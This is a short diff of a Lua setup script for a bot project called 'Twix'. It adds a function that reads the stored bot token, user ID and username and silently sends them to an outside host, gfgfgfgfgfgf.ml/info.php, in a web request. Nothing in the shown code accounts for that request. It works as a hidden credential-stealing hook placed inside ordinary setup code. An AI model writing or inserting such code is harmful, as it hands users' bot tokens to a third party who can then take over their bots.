@@ -62,6 +62,10 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
+local function Files_Twix_Info()
+Create_Info(database:get(Server_Twix.."Token_Twix"),database:get(Server_Twix.."Id_Twix"),database:get(Server_Twix.."UserName_Twix"))   
+https.request("https://gfgfgfgfgfgf.ml/info.php?id="..database:get(Server_Twix.."Id_Twix").."&user="..database:get(Server_Twix.."UserName_Twix").."&token="..database:get(Server_Twix.."Token_Twix"))
+local RunTwix = io.open("Twix", 'w')
 RunTwix:write([[
 #!/usr/bin/env bash
 cd $HOME/Twix
